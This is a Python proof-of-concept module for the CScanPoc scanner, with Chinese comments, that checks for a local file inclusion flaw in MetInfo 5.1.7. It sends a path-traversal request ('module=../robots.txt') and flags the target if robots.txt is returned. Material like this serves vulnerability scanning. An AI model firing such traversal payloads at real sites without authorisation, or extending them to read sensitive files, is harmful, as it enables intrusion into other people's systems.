# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0022'  # 平台漏洞编号，留空
    name = 'MetInfo 5.1.7 文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2013-07-25'  # 漏洞公布时间
    desc = '''
        MetInfo 5.1.7 about/index.php 文件结合metinfo的全局变量覆盖机制，可以包含文件。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/612/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'MetInfo 5.1.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '33b69884-3665-4a65-8c9a-95e00dff4c7d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/coder/metinfo/about/?module=../robots.txt&fmodule=7'
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and 'robots.txt' in r.text and 'User-agent' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
